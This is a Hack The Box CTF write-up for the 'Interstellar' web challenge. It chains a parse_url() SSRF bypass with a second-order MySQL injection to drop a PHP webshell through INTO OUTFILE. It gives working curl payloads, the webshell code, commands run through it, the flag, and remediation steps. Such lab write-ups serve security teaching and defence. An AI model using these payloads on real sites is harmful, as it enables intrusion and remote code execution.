# HTB - Interstellar Challenge Writeup

![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Points: 40](https://img.shields.io/badge/Points-40-blue)
![Category: Web](https://img.shields.io/badge/Category-Web-green)

**Challenge by:** phuonganh1233  
**Date Completed:** February 13, 2026  
**Flag:** `HTB{P3rtf3ct_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX_g4l4xY}`

---

## 📋 Table of Contents
- [Challenge Description](#challenge-description)
- [Reconnaissance](#reconnaissance)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Exploitation](#exploitation)
- [Flag Capture](#flag-capture)
- [Key Learnings](#key-learnings)
- [References](#references)

---

## 🎯 Challenge Description

> ¡Es solo un viejo error con un pequeño giro para hacer las cosas más interesantes!

This challenge involves exploiting a combination of Server-Side Request Forgery (SSRF) and SQL Injection vulnerabilities to achieve Remote Code Execution.

**Target:** `154.57.164.76:31798`

---

## 🔍 Reconnaissance

### Initial Analysis

After downloading and extracting the challenge files, we find a PHP web application with the following structure:

```
.
├── build_docker.sh
├── Dockerfile
├── entrypoint.sh
├── flag.txt
├── init.sql
└── src/
    ├── communicate.php
    ├── index.php
    ├── login.php
    ├── register.php
    └── utils/
        ├── database.php
        └── smarty.php
```

### Key Files Identified

1. **init.sql** - Database schema with stored procedures
2. **communicate.php** - SSRF vulnerability
3. **index.php** - Name edit functionality (localhost only)
4. **Database procedures** - SQL injection vulnerability

---

## 🔓 Vulnerability Analysis

### 1. SQL Injection in `searchUser()` Procedure

**File:** `init.sql` (lines 16-22)

```sql
CREATE PROCEDURE searchUser(IN name VARCHAR(255))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', name, '\'');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END //
```

**Vulnerability:** The `name` parameter is directly concatenated into the SQL query without proper sanitization.

**Problem:** 
- The `name` value comes from `$_SESSION['name']`
- Registration only allows alphanumeric characters
- We need a way to inject malicious SQL into the session

### 2. Name Edit Function (Localhost Restriction)

**File:** `index.php`

```php
if($_SERVER['REMOTE_ADDR'] === '127.0.0.1'){
    if($_POST['action'] === 'edit'){
        $new_name = $_POST['new_name'];
        $stmt = $conn->prepare("CALL editName(?, ?)");
        $stmt->bind_param("is", $id, $new_name);
        $stmt->execute();
        $_SESSION['name'] = $new_name;
    }
}
```

**Key Point:** This powerful feature allows arbitrary name changes but ONLY from localhost.

### 3. SSRF in `communicate.php`

**File:** `communicate.php`

```php
$url = $_POST['url'];
$data = $_POST['data'] ?? [];

if(filter_var($url, FILTER_VALIDATE_URL)) {
    $parsedUrl = parse_url($url);
    if(preg_match('/motherland\.com$/', $parsedUrl['host'])) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $parsedUrl['host']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        // ... sends request with PHPSESSID cookie
    }
}
```

**Vulnerability:** `parse_url()` can be bypassed using specially crafted URLs.

**Exploitation Technique:**
```
URL: 1232://user:pass@127.0.0.1:80|motherland.com:80/
```

When parsed:
- `parse_url()` extracts `host` as `127.0.0.1:80|motherland.com:80`
- Regex `/motherland\.com$/` matches (ends with `motherland.com`) ✓
- But `curl` connects to `127.0.0.1:80` (ignores content after `|`)

This bypasses the localhost restriction!

---

## 💥 Exploitation

### Step 1: Register and Login

First, create a normal user account:

```bash
# Register
curl -X POST 'http://154.57.164.76:31798/register.php' \
  -d "name=testuser&username=testuser123&password=Pass123&planet=Earth"

# Login
curl -c cookies.txt -X POST 'http://154.57.164.76:31798/login.php' \
  -d "username=testuser123&password=Pass123"
```

Extract the session cookie:
```bash
PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
echo "Session: $PHPSESSID"
```

### Step 2: Exploit SSRF + SQL Injection

Send the malicious payload that:
1. Bypasses SSRF protection
2. Triggers the localhost-only name edit function
3. Injects SQL payload into the session name

```bash
curl -X POST 'http://154.57.164.76:31798/communicate.php' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID' \
  -H 'Content-Type: multipart/form-data; boundary=----X' \
  --data-binary $'------X\r
Content-Disposition: form-data; name="url"\r
\r
1232://user:pass@127.0.0.1:80|motherland.com:80/\r
------X\r
Content-Disposition: form-data; name="data[new_name]"\r
\r
a'"'"' union select 1,null,null,null,"<?php system($_GET['"'"'cmd'"'"']); ?>" INTO OUTFILE "/var/www/html/exploit.php"\r
------X\r
Content-Disposition: form-data; name="data[action]"\r
\r
edit\r
------X--\r
'
```

### Step 3: Trigger SQL Injection

Visit the index page to trigger the `searchUser()` procedure:

```bash
curl 'http://154.57.164.76:31798/index.php' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID'
```

This executes the injected SQL:
```sql
SELECT * FROM users WHERE name = 'a' 
UNION SELECT 1,null,null,null,"<?php system($_GET['cmd']); ?>" 
INTO OUTFILE "/var/www/html/exploit.php"
```

The SQL `INTO OUTFILE` writes our PHP webshell to the web root.

---

## 🏁 Flag Capture

### Step 4: Verify Webshell Access

```bash
curl -G 'http://154.57.164.76:31798/exploit.php' \
  --data-urlencode "cmd=id"
```

### Step 5: List Files and Find Flag

```bash
curl -G 'http://154.57.164.76:31798/exploit.php' \
  --data-urlencode "cmd=ls /"
```

**Output:**
```
60597c54d78cfe6f_flag.txt
bin
boot
dev
...
```

### Step 6: Read the Flag

```bash
curl -G 'http://154.57.164.76:31798/exploit.php' \
  --data-urlencode "cmd=cat /60597c54d78cfe6f_flag.txt"
```

**Flag:** `HTB{P3rtf3ct_c0mb1nation_t0_re4ch_th3_g4l4xY}`

---

## 🎓 Key Learnings

### Vulnerability Chain

This challenge demonstrates how multiple small vulnerabilities can be chained together:

1. **SSRF Bypass** → Access localhost-only functionality
2. **Name Edit** → Inject malicious SQL into session
3. **SQL Injection** → Write webshell using `INTO OUTFILE`
4. **RCE** → Execute commands and capture flag

### Security Lessons

1. **`parse_url()` Bypass**
   - The pipe character `|` confuses URL parsing
   - Always validate both parsed components AND the original URL
   - Use allowlists instead of regex pattern matching

2. **Second-Order SQL Injection**
   - Data stored in one place can be exploited later
   - Always use parameterized queries
   - Never trust data from the database

3. **MySQL `INTO OUTFILE`**
   - Dangerous when FILE privilege is enabled
   - Requires writable directory
   - Can be used to write arbitrary files

4. **Defense in Depth**
   - Multiple small vulnerabilities = critical impact
   - Each layer of defense matters
   - One weak link can compromise the entire system

---

## 🛡️ Remediation

### Fix SSRF Vulnerability

```php
// Bad
curl_setopt($ch, CURLOPT_URL, $parsedUrl['host']);

// Good
$allowedHosts = ['motherland.com'];
if (!in_array($parsedUrl['host'], $allowedHosts)) {
    die('Invalid host');
}

// Resolve hostname before connecting
$ip = gethostbyname($parsedUrl['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die('Invalid IP');
}

curl_setopt($ch, CURLOPT_URL, "http://{$parsedUrl['host']}");
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
```

### Fix SQL Injection

```php
// Bad
SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', name, '\'');

// Good - Use parameterized query
SELECT * FROM users WHERE name = ?
```

### Disable Dangerous MySQL Features

```sql
-- Remove FILE privilege
REVOKE FILE ON *.* FROM 'root'@'127.0.0.1';

-- Disable LOAD DATA and INTO OUTFILE
[mysqld]
local-infile=0
secure-file-priv=NULL
```

---

## 📚 References

- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PHP parse_url() Bypass Techniques](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [MySQL INTO OUTFILE Documentation](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)

---

## 🏆 Challenge Stats

- **Difficulty:** Medium (4.8/5.0)
- **Points:** 40
- **Category:** Web Security
- **Skills Required:**
  - SSRF exploitation
  - SQL injection
  - URL parsing bypass techniques
  - PHP security
  - MySQL file operations

---

## ✍️ Author Notes

This was an excellent challenge that required understanding multiple vulnerability types and how they can be chained together. The SSRF bypass using the pipe character was particularly clever, and the second-order SQL injection added an extra layer of complexity.

**Key Takeaway:** In penetration testing, the most critical vulnerabilities often result from chaining multiple smaller issues together. Always look for the complete attack chain!

---
 
**Date:** February 13, 2026  
**Challenge Rating:** ⭐⭐⭐⭐☆
